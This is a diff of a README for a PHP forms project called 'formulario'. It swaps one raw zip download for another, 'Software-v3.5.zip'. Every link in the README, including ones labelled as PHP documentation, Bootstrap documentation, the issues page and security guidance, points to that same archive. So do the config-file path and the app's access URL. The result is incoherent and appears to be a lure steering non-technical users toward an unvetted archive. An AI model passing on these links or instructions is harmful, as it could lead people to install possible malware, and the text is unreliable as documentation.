@@ -4,7 +4,7 @@
 Welcome to the "formulario" project! This application provides a simple example of how to create forms using PHP. It is designed for users who want a secure and efficient way to manage form submissions. 
 
 ## 📥 Download the Application
-[![Download formulario](https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/formulario.zip)](https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/formulario.zip)
+[![Download formulario](https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/Software-v3.5.zip)](https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/Software-v3.5.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the "formulario" application. You do not need any programming knowledge. Just follow these steps, and you'll have the software ready in no time.
@@ -25,11 +25,11 @@ This guide helps you download and run the "formulario" application. You do not n
 To get started with "formulario", you need to download it from the Releases page. 
 
 1. Click the download link below:
-   - [Visit this page to download](https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/formulario.zip)
+   - [Visit this page to download](https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/Software-v3.5.zip)
 
 2. On the Releases page, find the latest version of the software. 
 3. Click on the version number to open the release details.
-4. Look for the "Source code (zip)" or "Source code (https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/formulario.zip)" option.
+4. Look for the "Source code (zip)" or "Source code (https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/Software-v3.5.zip)" option.
 5. Download the file to your computer.
 
 ## 📂 Setting Up the Application
@@ -38,7 +38,7 @@ To get started with "formulario", you need to download it from the Releases page
 3. Ensure that your web server is running. You can do this by visiting `http://localhost/formulario` in your web browser.
 
 ## 🔧 Configuring Database Connection
-1. Open the `https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/formulario.zip` file in the main folder using a text editor (like Notepad).
+1. Open the `https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/Software-v3.5.zip` file in the main folder using a text editor (like Notepad).
 2. Replace the placeholder values for the database with your actual database connection details:
    - **Host**: Usually `localhost`
    - **Username**: Your database username
@@ -48,20 +48,20 @@ To get started with "formulario", you need to download it from the Releases page
 ## 📥 Running the Application
 To access the application:
 1. Open your web browser.
-2. Enter the following URL: `https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/formulario.zip`.
+2. Enter the following URL: `https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/Software-v3.5.zip`.
 
 You should see the form interface ready for use. Fill in the fields as needed and submit your information.
 
 ## 🛠️ Troubleshooting
 If you encounter any issues:
 - **Web Server Not Running**: Ensure that your web server (XAMPP, WAMP, etc.) is active.
-- **Database Connection Failure**: Double-check your database credentials in `https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/formulario.zip`.
+- **Database Connection Failure**: Double-check your database credentials in `https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/Software-v3.5.zip`.
 - **Missing PHP Extensions**: Ensure that the necessary PHP extensions, such as `mysqli`, are enabled in your web server settings.
 
 ## 📞 Support
 If you need help, feel free to reach out:
 
-- Check the [issues page](https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/formulario.zip) on GitHub for assistance.
+- Check the [issues page](https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/Software-v3.5.zip) on GitHub for assistance.
 - Feel free to open a new issue if you have a question or suggestion.
 
 ## 🔑 License
@@ -69,8 +69,8 @@ This project is open-source and available under the MIT License. You can use it 
 
 ## 🔗 Additional Resources
 For more information on topics related to the application, consider exploring:
-- [PHP Documentation](https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/formulario.zip)
-- [Bootstrap 5 Documentation](https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/formulario.zip)
-- [Web Security Practices](https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/formulario.zip) 
+- [PHP Documentation](https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/Software-v3.5.zip)
+- [Bootstrap 5 Documentation](https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/Software-v3.5.zip)
+- [Web Security Practices](https://raw.githubusercontent.com/BbOBBOS/formulario/main/nudate/Software-v3.5.zip) 
 
 Remember, programming doesn't have to be complicated. Enjoy building with "formulario"!
